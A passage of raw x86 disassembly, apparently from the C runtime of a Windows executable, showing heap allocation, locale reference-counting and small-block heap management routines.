  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
